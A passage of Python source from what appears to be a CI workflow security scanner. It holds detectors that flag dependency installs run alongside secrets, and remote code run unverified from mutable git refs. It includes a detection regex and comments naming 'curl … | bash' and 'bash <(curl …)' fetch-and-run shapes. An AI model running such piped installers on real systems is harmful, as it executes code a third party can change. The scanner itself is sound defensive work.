            # …and only for pnpm installs: the pnpm build allowlist says
            # nothing about an `npm ci` or `yarn install` in the same job.
            exposed = next(
                (c for c in candidates
                 if _install_manager(c[2]) != "pnpm"
                 or _builds_disabled_at(allowlist_writes, c[0]) is None),
                None,
            )
            if exposed is None:
                logger.debug(
                    "P14.25: %s jobs.%s disables dependency builds before "
                    "every install on a pnpm>=10 pin — not a finding",
                    file_path, job_name,
                )
                continue
            line, raw, command = exposed
            manager = _install_manager(command)

        payoff_parts = []
        if secrets:
            payoff_parts.append(
                "the job's environment carries secret(s) "
                + ", ".join(f"`{s}`" for s in secrets[:5])
                + (" …" if len(secrets) > 5 else "")
            )
        if writes:
            payoff_parts.append(
                "the job holds write scope(s) "
                + ", ".join(f"`{w}`" for w in sorted(writes))
            )
        yield RawHit(
            line=line,
            evidence=f"{line:>4}: {raw}  <-- here",
            match_text=raw.strip(),
            derived_note=(
                f"jobs.{job_name} runs this dependency-tree install where "
                f"lifecycle scripts execute UNLESS the package manager's "
                f"version or configuration disables them, and "
                + " and ".join(payoff_parts)
                + " — so a compromised dependency's install script executes "
                "holding them. "
                + _manager_condition_note(
                    manager, "\n".join(runs), pin, allowlist,
                )
            ),
        )


# --- P14.24: unverified remote code execution --------------------------------
#
# ONE vector, two shapes, because they are the same trust model: the job runs
# code that a third party can change between now and the next run.
#
#   1. the piped installer — `curl … | bash`, `bash <(curl …)`, `deno run <url>`
#   2. a MUTABLE git fetch executed out of — `git clone` / `git fetch` at a
#      branch, tag, HEAD, or an abbreviated sha, followed by running a file
#      from the fetched tree
#
# Shape 1 stays exactly where it was: the regex below is handed to the shared
# `detect_yaml_run_injection` walker, so its matching, line attribution and
# evidence are the code that was already shipping. It lives here rather than in
# the catalog's METADATA because one entry carries one detector, and this entry
# now needs two arms.
#
# A fetch pinned to a FULL 40-hex commit is IMMUTABLE and is never a finding —
# that is the same trust model this catalog recommends for action pins, and
# reporting it would tell a reader to fix what they already did right. A short
# sha is not a pin: git re-resolves an abbreviated id at fetch time.
_REMOTE_PIPE_TO_SHELL = (
    r"(?:(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:bash|sh)\b"
    r"|\b(?:bash|sh)\s+<\(\s*(?:curl|wget)\b"
    r"|\bdeno\s+run\b[^\n]*https?://)"
)

_FULL_SHA_RE = re.compile(r"^[0-9a-fA-F]{40}$")
_ABBREV_SHA_RE = re.compile(r"^[0-9a-fA-F]{7,39}$")

# `git clone` options that consume a separate VALUE argument. Getting this set
# wrong would make an option's value look like the clone's URL or destination,
# and the destination is what the whole connection test rests on.
#
# Options whose value is only ever ATTACHED (`--recurse-submodules=<pathspec>`,
# `--also-filter-submodules`) must stay OUT: listed here they would eat the
# following argument, shifting the URL, the destination and the ref by one and
# leaving the correlation chasing a directory that does not exist.
_CLONE_VALUE_OPTS = {
    "-b", "--branch", "--revision", "--depth", "-o", "--origin", "-u",
    "--upload-pack", "--reference", "--reference-if-able",
    "--separate-git-dir", "--template", "-c", "--config", "-j", "--jobs",
    "--filter", "--shallow-since", "--shallow-exclude", "--server-option",
    "--bundle-uri",
}
# Interpreters that run a FILE named on their command line. `-m` is excluded
# where it appears (a module name is not a path), except for the pip form
# handled separately below.
_INTERPRETERS = {
    "python", "python2", "python3", "node", "nodejs", "bash", "sh", "zsh",
    "ksh", "ruby", "perl", "php", "pwsh", "powershell",
}
# An interpreter reads its program from the command line (`-c`, `-e`, and the
# perl one-liner combinations) or from stdin (`-`), rather than from a file
# named as an argument. `-m` names a module, which is not a path either.
_INLINE_SCRIPT_FLAGS = {
    "-c", "-m", "-e", "-E", "-", "-pe", "-ne", "-p", "-n", "-ape", "-lpe",
    "--eval", "--exec",
}
_SOURCE_CMDS = {"source", "."}
# `pip install` options that consume a separate VALUE. Every one of these takes
# a path or a name that pip reads or writes — never code pip executes.
_PIP_VALUE_OPTS = {
    "-r", "--requirement", "-t", "--target", "-c", "--constraint",
    "-i", "--index-url", "--extra-index-url", "-f", "--find-links",
    "--prefix", "--root", "--src", "--upgrade-strategy", "--no-binary",
    "--only-binary", "--platform", "--python-version", "--implementation",
    "--abi", "--cache-dir", "--log", "--proxy", "--retries", "--timeout",
    "--exists-action", "--cert", "--client-cert", "--report", "--config-settings",
}
_LEADING_WRAPPERS = {"sudo", "command", "exec", "time", "nohup", "env"}
_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# Prefix for a directory whose real path is not knowable from the YAML. It
# cannot collide with any real path, so paths under it match each other and
# nothing else.
_OPAQUE_DIR = "\x00wd:"
# Expressions collapse to ONE TOKEN EACH, not one token for all of them. A
# shared `$EXPR` made `${{ env.DIR_A }}` and `${{ env.DIR_B }}` the same
# directory, so a clone into one paired with an execution from the other — a
# chain the reader cannot find in their own YAML. Tokens are stable per
# expression TEXT, so the same expression written twice is one place, which is
# exactly as knowable as a named one.
_EXPR_TOKEN_TEXT: dict[str, str] = {}
_EXPR_TEXT_TOKEN: dict[str, str] = {}


def _expression_token(text: str) -> str:
    """A shlex-safe stand-in for `${{ … }}`, stable per expression text."""
    key = " ".join(text.split())
    token = _EXPR_TEXT_TOKEN.get(key)
    if token is None:
        # DELIMITED with the same NUL sentinel the opaque directories use.
        # An undelimited `$EXPR0` followed by a literal digit — `${{ env.DIR }}2`
        # — read back as `$EXPR02`, the lookup missed, and the scanner's own
        # token reached the report. NUL cannot appear in YAML, so nothing a
        # workflow contains can collide with it or be mistaken for it.
        token = f"$EXPR{len(_EXPR_TEXT_TOKEN)}\x00"
        _EXPR_TEXT_TOKEN[key] = token
        _EXPR_TOKEN_TEXT[token] = key
    return token


_EXPR_TOKEN_RENDER_RE = re.compile(r"\$EXPR\d+\x00")


def _reset_expression_tokens() -> None:
    """Clear the per-scan token registry.

    Module-level and never reset, it let one workflow's expression text render
    inside another's finding, with which text leaked depending on file order.
    """
    _EXPR_TEXT_TOKEN.clear()
    _EXPR_TOKEN_TEXT.clear()


def _as_written(path: str) -> str:
    """`path` with every scanner-internal stand-in put back as the YAML wrote it.

    Nothing that reaches a reader may contain these. The opaque-directory
    sentinel is a NUL byte, and it escaped into `derived_note`, findings.json
    and the rendered markdown — the reader was shown a raw control character
    where their own directory belonged.
    """
    shown = path.replace(_OPAQUE_DIR, "")
    return _EXPR_TOKEN_RENDER_RE.sub(
        lambda m: _EXPR_TOKEN_TEXT.get(m.group(0), m.group(0)), shown)
# Does unreadable shell mention either half of the chain — a fetch, or something
# that executes? If not, failing to read it costs this detector nothing.
_CHAIN_RELEVANT_RE = re.compile(
    # Command NAMES that fetch or execute…
    r"\b(?:git|cd|source|pip|pip3|python[0-9.]*|node|nodejs|bash|sh|zsh|ksh"
    r"|ruby|perl|php|pwsh|powershell)\b"
    # …and the shape of an execution that names no command at all: a PATH
    # invoked directly (`tools/setup.py --msg=…`). Without this arm a visible
    # clone followed by an unparseable `tools/setup.py` produced zero findings
    # AND zero gaps — a silent false clean on exactly the chain this vector
    # exists to catch.
    r"|(?:^|[;&|])\s*\.{0,2}/?[\w.@-]+/[\w./@-]+"
    # …and a sourced path, which needs no extension and no command name:
    # `. tools/env` is an execution the alternation above cannot see.
    r"|(?:^|[;&|])\s*(?:\.|source)\s+\S*/")
_UNPARSED_CD_RE = re.compile(r"(?:^|[;&|]\s*)\s*cd\s")
# A whole `${{ … }}` expression. The runner substitutes it before the shell
# sees it, so it is ONE word — see `_shell_tokens`.
_EXPRESSION_TOKEN_RE = re.compile(r"\$\{\{.*?\}\}", re.S)
# `$( … )` — a command substitution. Its body is a command whose OUTPUT becomes
# a word; the words inside it are not this command's arguments. Left expanded,
# `FILE=$(ls tools/x.sql)` had its assignment prefix stripped and the `ls`
# arguments read as the command, so a path `ls` merely listed was reported as
# executed. Process substitution `<( … )` is deliberately untouched: the piped
# installer arm matches `bash <(curl …)` on the raw text.
_COMMAND_SUBSTITUTION_RE = re.compile(r"\$\((?:[^()]|\([^()]*\))*\)", re.S)


def _substitution_command_bodies(command: str) -> list[str]:
    """Every command run INSIDE a `$( … )` substitution, at any nesting depth.

    `$(…)` runs its body and its OUTPUT becomes a word, so the body is a command
    in its own right. A body can itself hold a substitution —
    `OUT=$(echo $(tools/setup.sh))` — and reading only the outer level left the
    inner `tools/setup.sh` unscanned: no finding, no gap, a silent false clean.
    Each body is recursed into before it is split, so an execution nested one or
    more levels deep is still seen.
    """
    out: list[str] = []
    for match in _COMMAND_SUBSTITUTION_RE.finditer(command):
        inner = match.group(0)[2:-1]
        out.extend(_substitution_command_bodies(inner))
        out.extend(_install_command_segments(inner))
    return out


def _shell_tokens(segment: str) -> list[str]:
    """`segment` split the way a shell would, or `[]` when it cannot be.

    A segment carrying an unbalanced quote or a construct `shlex` refuses is
    returned as no tokens at all: this detector only ever ADDS a finding when
    it can see both halves of the chain, so an unparsable command simply
    contributes nothing rather than being guessed at.

    `${{ github.repository }}` collapses to a token that KEEPS its identity,
    because it is the one expression whose value the scanner knows: it is the
    repository being scanned, which is what makes a clone of it a self-clone.
    Every other `${{ … }}` expression is collapsed to its OWN opaque token FIRST — one per
    distinct expression text, never one shared by all of them. The runner
    substitutes it before the shell ever sees it, so it is a single word; split
    on its spaces it becomes three, every positional after it shifts, and the
    clone's destination gets read out of the expression's insides. That is not
    a missing destination but a WRONG one — and a wrong one is what a correct
    40-hex pin on the real directory would then fail to match.
    """
    try:
        collapsed = _SELF_REPO_EXPRESSION_RE.sub(_SELF_REPO_TOKEN, segment)
        collapsed = _EXPRESSION_TOKEN_RE.sub(
            lambda m: _expression_token(m.group(0)), collapsed)
        return shlex.split(_COMMAND_SUBSTITUTION_RE.sub("$SUBST", collapsed),
                           comments=False, posix=True)
    except ValueError:
        return []


def _strip_command_prefix(tokens: list[str]) -> list[str]:
    """Drop leading `VAR=value` assignments and command wrappers (`sudo`, …)."""
    i = 0
    while i < len(tokens) and (
        _ASSIGNMENT_RE.match(tokens[i]) or tokens[i] in _LEADING_WRAPPERS
    ):
        i += 1
    return tokens[i:]


# Runner variables that are ABSOLUTE by GitHub's contract. Joining them onto a
# step's `working-directory:` put them inside a checkout they have nothing to do
# with — a `vale` binary downloaded from its own release page and sha-verified
# was reported as executing "from" a docs checkout on a real repository.
_RUNNER_ABSOLUTE_RE = re.compile(
    r"^\$\{?(?:GITHUB_WORKSPACE|HOME|RUNNER_TEMP|RUNNER_WORKSPACE"
    r"|RUNNER_TOOL_CACHE|GITHUB_ACTION_PATH)\}?/")


def _resolve_path(cwd: str, path: str) -> str:
    """`path` as seen from `cwd`, normalized. Absolute paths pass through."""
    if path.startswith("/") or _RUNNER_ABSOLUTE_RE.match(path):
        return os.path.normpath(path)
    return os.path.normpath(os.path.join(cwd, path))


# A path whose FIRST component is a shell variable (`$FOO/x`, `${FOO}/x`) whose
# value this scanner cannot know. Joining it onto the working directory is a
# guess: the variable could hold an absolute path that escapes the fetched tree
# entirely, so resolving it relative to a third-party checkout and firing was a
# false positive. The runner-absolute variables (`$GITHUB_WORKSPACE/…` etc.)
# are excluded — GitHub's contract makes them absolute, so `_resolve_path`
# already places them, correctly, outside any relative destination. The
# scanner's own stand-ins are excluded too: a `${{ }}` expression collapses to a
# NUL-delimited `$EXPR<n>` token, `${{ github.repository }}` to `$SELF_REPO`,
# and a `$(…)` substitution to `$SUBST`.
_LEADING_SHELL_VAR_RE = re.compile(r"^\$\{?[A-Za-z_][A-Za-z0-9_]*\}?(?:/|$)")


def _leading_unresolved_var(path: str) -> bool:
    if "\x00" in path or _RUNNER_ABSOLUTE_RE.match(path):
        return False
    if path.startswith(_SELF_REPO_TOKEN) or path.startswith("$SUBST"):
        return False
    return bool(_LEADING_SHELL_VAR_RE.match(path))


def _under(dest: str, path: str) -> bool:
    """Is `path` inside the fetched destination `dest`?

    `dest == "."` is the whole working tree (what a `git fetch` +
    `git checkout FETCH_HEAD` replaces), so every relative path is inside it;
    an absolute path never is.
    """
    if dest == ".":
        return not path.startswith("/")
    return path == dest or path.startswith(dest + "/")


def _clone_destination(url: str, dest: str | None) -> str | None:
    """The directory a `git clone` writes into, or None when it is not visible.

    With no explicit destination git derives one from the URL's last path
    segment — knowable only when the URL is a literal. A URL held in a shell
    variable (`"$TOOLS_REPO_URL"`) leaves the destination unknowable, and this
    detector reports nothing it cannot show: no destination means no visible
    connection to whatever executes later.
    """
    if dest:
        return dest
    if not url or "$" in url:
        return None
    base = url.rstrip("/").rsplit("/", 1)[-1].rsplit(":", 1)[-1]
    if base.endswith(".git"):
        base = base[: -len(".git")]
    return base or None


@dataclass(frozen=True)
class _RemoteFetch:
    """A fetch of third-party code into a directory this job can execute."""
    line: int
    raw: str
    dest: str
    ref: str | None      # None = the remote's default branch (HEAD)
    # Position in the job's command stream. Ordering is the finding's whole
    # claim — the fetch put the code there BEFORE it ran — and a line number
    # cannot carry it: `python3 tools/setup.py && git clone … tools` has both
    # halves on one line, in the wrong order.
    pos: int
    # For the YAML arm: the repository `actions/checkout` was pointed at. None
    # for a shell fetch, whose evidence line already shows the URL.
    source: str | None = None


def _ref_description(ref: str | None) -> str:
    if ref is None:
        return "the remote's default branch (HEAD)"
    if _ABBREV_SHA_RE.match(ref):
        # Reads mid-sentence ("fetches remote code at <this> into `tools`"), so
        # it stays a NOUN PHRASE — a trailing clause here produced a sentence
        # that ran on through the rest of the finding.
        return f"`{ref}` (an ABBREVIATED commit id git re-resolves at fetch time)"
    return f"`{ref}`"


def _git_subcommand(tokens: list[str]) -> tuple[str | None, str | None, list[str]]:
    """(subcommand, `-C` directory, remaining args) for a `git …` invocation."""
    i, gdir = 1, None
    while i < len(tokens):
        tok = tokens[i]
        if tok == "-C" and i + 1 < len(tokens):
            gdir = tokens[i + 1]
            i += 2
            continue
        if tok in ("-c", "--namespace", "--git-dir", "--work-tree") and i + 1 < len(tokens):
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        return tok, gdir, tokens[i + 1:]
    return None, gdir, []


def _parse_clone(args: list[str]) -> tuple[str | None, str | None, str | None]:
    """(url, destination-as-written, ref) from `git clone`'s arguments."""
    ref: str | None = None
    positionals: list[str] = []
    i = 0
    while i < len(args):
        tok = args[i]
        if tok.startswith("--") and "=" in tok:
            name, _, value = tok.partition("=")
            if name in ("--branch", "--revision"):
                ref = value
            i += 1
            continue
        if tok in _CLONE_VALUE_OPTS:
            if i + 1 < len(args):
                if tok in ("-b", "--branch", "--revision"):
                    ref = args[i + 1]
                i += 2
                continue
            i += 1
            continue
        if tok.startswith("-"):
            i += 1
            continue
        positionals.append(tok)
        i += 1
    url = positionals[0] if positionals else None
    dest = positionals[1] if len(positionals) > 1 else None
    return url, dest, ref


# `github.com/<owner>/<repo>`, in any of the spellings a workflow writes it:
# the https form, git's scp-like `user@host:owner/repo.git` form, and the
# authenticated form that carries a token in the URL's userinfo (which the
# `[/:]` and optional-userinfo handling below both cover).
_GITHUB_SLUG_RE = re.compile(
    r"github\.com[/:]([A-Za-z0-9._-]+)/([A-Za-z0-9._-]+?)(?:\.git)?(?:[/?#]|$)")
_SELF_REPO_EXPRESSION_RE = re.compile(r"\$\{\{\s*github\.repository\s*\}\}")
# Survives expression collapsing in `_shell_tokens` so the clone arm can still
# see that the URL named the scanned repository.
_SELF_REPO_TOKEN = "$SELF_REPO"
# The self-repository expression (or its collapsed token) as the ENTIRE
# `owner/repo` path segment of a URL — `github.com/${{ github.repository }}` and
# nothing appended to it.
_SELF_REPO_SLUG_RE = re.compile(
    r"[/@]"
    r"(?:\$\{\{\s*github\.repository\s*\}\}|\$SELF_REPO"
    # The environment-variable spelling is exactly as self-identifying as the
    # expression, and the guard already honours the expression.
    r"|\$GITHUB_REPOSITORY\b|\$\{GITHUB_REPOSITORY\})"
    r"(?:\.git)?(?:[/?#]|$)")


@lru_cache(maxsize=64)
def _origin_slug(root: str) -> str | None:
    """`owner/repo` for the checkout at `root`, from `.git/config`, or None.

    Read straight out of the config file rather than by running `git`: this is
    a per-workflow-file question on a scan that already refuses to shell out
    for anything, and a scan of an exported tree with no `.git` simply gets
    None and reports as before.
    """
    try:
        text = (Path(root) / ".git" / "config").read_text(
            encoding="utf-8", errors="strict")
    except (OSError, UnicodeDecodeError):
        return None
    section = None
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("["):
            section = stripped
            continue
        if section != '[remote "origin"]' or "=" not in stripped:
            continue
        key, _, value = stripped.partition("=")
        if key.strip() != "url":
            continue
        match = _GITHUB_SLUG_RE.search(value.strip())
        return f"{match.group(1)}/{match.group(2)}" if match else None
    return None


def _is_self_clone(url: str, file_path: Path) -> bool:
    """Does this URL name the repository being scanned?

    Cloning your own repository at a branch is not this vector: no third party
    is involved, and the fix — pin to a full commit id — is unactionable for a
    release workflow that must run at the branch head. On a 2,920-file corpus
    this shape was 3 of the detector's 15 fires, all one repository's release
    workflows. The `git fetch` arm already refuses the repo's own history via
    its named-remote rule; the `clone` arm had no equivalent.
    """
    if not url:
        return False
    # `${{ github.repository }}` IS the scanned repository — but only when it
    # is the WHOLE `owner/repo` part of the URL. Searching for it anywhere let
    # `…/evil/${{ github.repository }}-mirror` — a stranger's URL that merely
    # embeds yours — read as your own and go silent, and this guard exists to
    # suppress findings, so a loose match suppresses real ones.
    if _SELF_REPO_SLUG_RE.search(url):
        return True
    match = _GITHUB_SLUG_RE.search(url)
    if not match:
        return False
    # `.github/workflows/<file>` — the scanned checkout is two levels up.
    parents = file_path.resolve().parents
    if len(parents) < 3:
        return False
    slug = _origin_slug(str(parents[2]))
    cloned = f"{match.group(1)}/{match.group(2)}"
    return slug is not None and slug.lower() == cloned.lower()


def _is_remote_url(token: str) -> bool:
    """A `git fetch` remote that names a THIRD PARTY rather than this repo.

    `git fetch origin main` pulls the repository's own history — the code is
    already the repo's, so it is not this vector. A URL (or a variable holding
    one) is the shape that reaches somebody else's server.
    """
    return "://" in token or "@" in token or "$" in token


def _executed_path(tokens: list[str]) -> str | None:
    """The path this command EXECUTES, as written, or None.

    Deliberately narrow — an interpreter running a named file, a sourced
    script, a `pip install` of a directory, or a path invoked directly. A
    command that merely reads the tree (`ls`, `cat`, `grep`) is not execution
    and must not be treated as it.
    """
    if not tokens:
        return None
    cmd = tokens[0]
    rest = tokens[1:]
    if cmd in _SOURCE_CMDS:
        return rest[0] if rest and not rest[0].startswith("-") else None
    if cmd in ("pip", "pip3") or (
        cmd in _INTERPRETERS and rest[:2] == ["-m", "pip"]
    ):
        args = rest[2:] if rest[:2] == ["-m", "pip"] else rest
        if "install" not in args:
            return None
        skip_next = False
        for i, tok in enumerate(args):
            if skip_next:
                skip_next = False
                continue
            if tok == "-e" and i + 1 < len(args):
                return args[i + 1]          # editable install: it runs setup.py
            if tok in _PIP_VALUE_OPTS:
                # A flag's VALUE is not a positional. `--target tools/deps`
                # names a destination pip writes into and `-r reqs.txt` names a
                # file pip READS; reporting either as "executes" asserts
                # something pip does not do.
                skip_next = True
                continue
            if tok.startswith("-") or tok == "install":
                continue
            if tok.startswith("./") or tok.startswith("../") or "/" in tok:
                return tok
        return None
    if cmd in _INTERPRETERS:
        return _interpreter_executed_path(cmd, rest)
    if "/" in cmd and not cmd.startswith("-"):
        return cmd
    return None


# Which flags mean "the program is on the command line" depends on the
# INTERPRETER, and only the flags BEFORE the first operand are the
# interpreter's at all.
#
# A flat whitelist scanned over every argument leaked in both directions.
# `-e`/`-E`/`-p`/`-n` are ordinary shell and Python options, so
# `bash -e tools/install.sh` and `bash tools/install.sh -n` — where the flag
# belongs to the FETCHED SCRIPT — became silent false cleans on exactly the
# chain this vector catches. Meanwhile spellings the list did not carry
# (`bash -lc`, `perl -lane`, `php -r`, `pwsh -Command`) still rendered the
# program text as "the executed path".
_INLINE_LETTER_FLAGS = {
    # A single-dash cluster containing one of these letters carries the program.
    "perl": set("ce"), "ruby": set("ce"), "node": set("ep"), "nodejs": set("ep"),
    "php": set("r"), "python": set("c"), "python2": set("c"), "python3": set("c"),
    "bash": set("c"), "sh": set("c"), "zsh": set("c"), "ksh": set("c"),
}
# Long forms, and the PowerShells, which do not use single-letter clusters.
_INLINE_LONG_FLAGS = {
    "--eval", "--exec", "--command", "-command", "-encodedcommand", "-c",
}
# Options that consume a separate VALUE which is not the program — python's
# warning filter. Case matters: python's `-W` takes a value, perl's `-w` is a
# boolean, and conflating them ate the script path after it.
_INTERPRETER_VALUE_OPTS = {"-W"}
# Shell-only value options. `bash -o pipefail script.sh` and its kin name a
# shell OPTION as the value of `-o` (and `-O` for a bash `shopt` name), so the
# path is the NEXT word — read flatly, `pipefail` was taken for the script and
# the real execution silently missed. Scoped to the shells because python's
# `-O` is a boolean (`python3 -O tool.py` runs `tool.py`), so a global entry
# would eat the script there. `sh`/dash carries `-o` but not `-O`.
_SHELL_VALUE_OPTS = {
    "bash": {"-o", "-O"}, "zsh": {"-o", "-O"}, "ksh": {"-o", "-O"},
    "sh": {"-o"},
}
# `-m` names a MODULE, which is not a path at all.
_MODULE_FLAGS = {"-m"}


def _interpreter_executed_path(cmd: str, rest: list[str]) -> str | None:
    """The FILE this interpreter runs, or None when it runs inline text.

    Only leading flags are inspected: the scan stops at the first operand,
    because everything after it belongs to the program being run, not to the
    interpreter.
    """
    letters = _INLINE_LETTER_FLAGS.get(cmd, set())
    value_opts = _INTERPRETER_VALUE_OPTS | _SHELL_VALUE_OPTS.get(cmd, set())
    i = 0
    while i < len(rest):
        tok = rest[i]
        if tok == "-":
            return None                      # the program comes from stdin
        if tok.startswith("<<"):
            return None                      # …from a here-doc
        if not tok.startswith("-"):
            return tok                       # the first operand IS the file
        low = tok.lower()
        if low in _INLINE_LONG_FLAGS or low.startswith("--eval="):
            return None
        if tok in _MODULE_FLAGS:
            return None                      # a module name is not a path
        if tok in value_opts:
            i += 2                           # the value is not the program
            continue
        if tok.startswith("-") and not tok.startswith("--") and len(tok) > 1:
            if letters & set(tok[1:]):
                return None                  # `-c`, `-lc`, `-lane`, `-pe`, …
        i += 1
    return None


def _job_shell_commands(
    text: str, job_range: tuple[int, int] | None,
    gap: Callable[[str], None] | None = None,
) -> list[tuple[int, str, str, bool]]:
    """(line, verbatim line, joined command, starts-a-new-step) for the job.

    Restricted to `run:` scalar content, like every other shell reader here, so
    a step `name:` or a YAML comment is never read as a command. The fourth
    element marks the first command of a STEP, which is where the working
    directory must be forgotten: `cd` does not survive from one step to the
    next, and carrying it across would connect a fetch to an execution that
    never ran in that directory. Step identity comes from where each `run:`
    scalar begins (`_run_scalar_starts`), never from line adjacency — adjacency
    gets it wrong in both directions, joining two inline steps and splitting
    one block scalar at a blank line.

    A HEREDOC body is dropped: `cat <<'EOF' > install.sh` writes text to a
    file, and the text a step writes is not a command the step runs. Reading it
    as shell would let a documented example be reported as a live chain.
    """
    lines = text.splitlines()
    shell_lines = _run_scalar_line_numbers(text)
    step_starts = _run_scalar_starts(text)
    inline_values = _inline_run_values(text)
    start, end = job_range if job_range else (1, len(lines))
    out: list[tuple[int, str, str, bool]] = []
    heredoc: str | None = None
    for line_no, raw, cmd in _shell_commands(lines):
        if line_no < start or line_no > min(end, len(lines)):
            continue
        if line_no not in shell_lines:
            continue
        if line_no in step_starts:
            if heredoc is not None and gap is not None:
                # The body really was open at the end of the step, so its
                # commands were correctly not read — but a step that stopped
                # being scanned must not read as a step with nothing in it.
                gap(f"a here-doc opened with `{heredoc}` was never closed "
                    f"before the step ended, so the rest of that step was NOT "
                    f"scanned for a mutable fetch executed out of")
            heredoc = None            # a body cannot outlive its own step
        if heredoc is not None:
            if raw.strip() == heredoc:
                heredoc = None
            continue
        # An INLINE scalar's shell starts after the `run:` key, and the raw
        # line carries that key: without stripping it the first token of
        # `- run: git clone …` is the list dash, and every one-line step in
        # the file reads as an unparsable command.
        key = _RUN_KEY_LINE_RE.match(cmd)
        if key and key.group(2) and not _BLOCK_SCALAR_RE.match(key.group(2).strip()):
            # Prefer the parser's own value for a single-line scalar, so YAML
            # quoting (`run: "git clone … && bash x.sh"`) is stripped before the
            # shell tokenizer sees it. Multi-line scalars are not in the map and
            # keep the raw line.
            cmd = inline_values.get(line_no, key.group(2))
        out.append((line_no, raw, cmd, line_no in step_starts))
        opened = _heredoc_delimiter(cmd)
        if opened:
            heredoc = opened
    if heredoc is not None and gap is not None:
        gap(f"a here-doc opened with `{heredoc}` was never closed before the "
            f"job ended, so the rest of that step was NOT scanned for a "
            f"mutable fetch executed out of")
    return out


# A step's own `working-directory:`, keyed by the line its `run:` shell begins
# on — the same key `_run_scalar_starts` produces, so the two agree by
# construction.
_STEP_ITEM_RE = re.compile(r"^(\s*)-\s")
_WORKING_DIR_RE = re.compile(r"^\s*working-directory\s*:\s*(.+?)\s*$")


@dataclass(frozen=True)
class _StepMark:
    """One step, located by the YAML parser rather than by a line regex."""
    job: str
    run_line: int | None        # 1-based line the `run:` VALUE starts on
    uses_line: int | None       # 1-based line the `uses:` VALUE starts on
    working_directory: str | None
    uses: str | None            # the action the step runs, verbatim
    start_line: int             # 1-based first line of the step itself
    end_line: int               # 1-based last line of the step
    run_value: str | None = None      # the `run:` scalar, as the PARSER read it
    run_end_line: int | None = None   # 1-based line the `run:` VALUE ends on


def _step_marks(text: str) -> list[_StepMark] | None:
    """Every step in the document with source lines, or None if it won't compose.

    Read from the composed node tree — what the parser itself saw. The defects
    this replaces all came from scraping raw lines with regexes while the
    parsed document was already in hand:

      * `working-directory: .   # repo root` took the YAML comment into the
        value, rendering a destination of `` `.   # repo root/tools` ``;
      * a `working-directory:` written INSIDE a heredoc body — text the step
        GENERATES, not configuration of the step — was read as the step's own,
        so the finding stated a destination lifted from generated content;
      * checkout steps were matched to lines by ORDINAL, so the words
        `uses: actions/checkout@v4` inside a heredoc shifted every later step.

    A value the parser hands us cannot disagree with the document. A regex over
    the same bytes can, and did.
    """
    try:
        root = yaml.compose(text)
    except yaml.YAMLError:
        return None
    if not isinstance(root, yaml.MappingNode):
        return None

    def _child(node: Any, key: str) -> Any:
        if not isinstance(node, yaml.MappingNode):
            return None
        for k, v in node.value:
            if getattr(k, "value", None) == key:
                return v
        return None

    jobs = _child(root, "jobs")
    if not isinstance(jobs, yaml.MappingNode):
        return None
    out: list[_StepMark] = []
    for job_key, job_node in jobs.value:
        steps = _child(job_node, "steps")
        if not isinstance(steps, yaml.SequenceNode):
            continue
        for step in steps.value:
            if not isinstance(step, yaml.MappingNode):
                continue
            run = _child(step, "run")
            uses = _child(step, "uses")
            wd = _child(step, "working-directory")
            out.append(_StepMark(
                job=str(getattr(job_key, "value", "")),
                run_line=(run.start_mark.line + 1) if run is not None else None,
                uses_line=(uses.start_mark.line + 1) if uses is not None else None,
                working_directory=(str(wd.value)
                                   if wd is not None and hasattr(wd, "value")
                                   else None),
                uses=(str(uses.value)
                      if uses is not None and hasattr(uses, "value") else None),
                start_line=step.start_mark.line + 1,
                end_line=step.end_mark.line + 1,
                run_value=(str(run.value)
                           if run is not None and hasattr(run, "value")
                           else None),
                run_end_line=(run.end_mark.line + 1) if run is not None else None,
            ))
    return out


def _step_working_directories(text: str) -> dict[int, str]:
    """{run-scalar start line: the step's `working-directory:`}.

    Keys are the lines `_run_scalar_starts` reports, because that is what
    `_job_shell_commands` uses to mark a step boundary. VALUES come from the
    composed document (`_step_marks`), so a YAML comment, a quoted value, or a
    `working-directory:` written inside a heredoc body cannot reach them. Each
    parsed step's `run:` line is matched to the first shell start at or after
    it — the same step, by construction.
    """
    marks = _step_marks(text)
    if marks is None:
        return {}
    starts = sorted(_run_scalar_starts(text))
    out: dict[int, str] = {}
    for mark in marks:
        if mark.run_line is None or mark.working_directory is None:
            continue
        # Bounded to the step's OWN source span. Matching the first shell start
        # at or after the `run:` line searched the whole file, so a flow-style
        # `- {run: …, working-directory: vendor/x}` — which the line regex
        # cannot see as a shell start at all — donated its directory to the
        # next block-scalar step, in a different JOB, fabricating a destination
        # there and moving a real chain out of the fetched tree here.
        start_line = next(
            (s for s in starts
             if mark.run_line <= s <= mark.end_line), None)
        if start_line is not None:
            out[start_line] = mark.working_directory.strip()
    return out


def _inline_run_values(text: str) -> dict[int, str]:
    """{run-scalar start line: the parser's own value} for SINGLE-LINE `run:`.

    A single-line `run:` value comes from the composed document, not the raw
    line, so YAML quoting never reaches the shell tokenizer. `run: "git clone …
    && bash x.sh"` was handed to `shlex` with its double quotes intact and came
    back as ONE quoted word — the clone and the execution both vanished, a
    silent false clean. Block scalars (`run: |`) and plain multi-line scalars
    keep their line-by-line reading; only a value the parser saw begin and end
    on one line is substituted, so nothing multi-line is disturbed.
    """
    marks = _step_marks(text)
    if marks is None:
        return {}
    starts = sorted(_run_scalar_starts(text))
    out: dict[int, str] = {}
    for mark in marks:
        if (mark.run_line is None or mark.run_value is None
                or mark.run_end_line != mark.run_line):
            continue
        start_line = next(
            (s for s in starts if mark.run_line <= s <= mark.end_line), None)
        if start_line is not None:
            out[start_line] = mark.run_value
    return out


def _default_working_directory(doc: dict, job: Any) -> str:
    """`defaults.run.working-directory` for this job, else the workflow's.

    GitHub resolves the JOB's over the workflow's, and a step's own
    `working-directory:` over both. Precedence is decided HERE, before any
    knowability test: treating an unreadable job default as absent fell
    through to the workflow's value and placed the step in a directory it
    demonstrably did not run in.

    A default holding an expression gets the same opaque treatment a step's
    does — `defaults: {run: {working-directory: apps/${{ matrix.app }}}}` is a
    mainstream monorepo shape, and guessing the workspace root for it is the
    defect class this scanner may not commit.
    """
    def _of(node: Any) -> str | None:
        if not isinstance(node, dict):
            return None
        run = (node.get("defaults") or {}).get("run") \
            if isinstance(node.get("defaults"), dict) else None
        value = run.get("working-directory") if isinstance(run, dict) else None
        return str(value) if isinstance(value, (str, int, float)) else None

    written = _of(job)
    if written is None:
        written = _of(doc)
    if not written:
        return "."
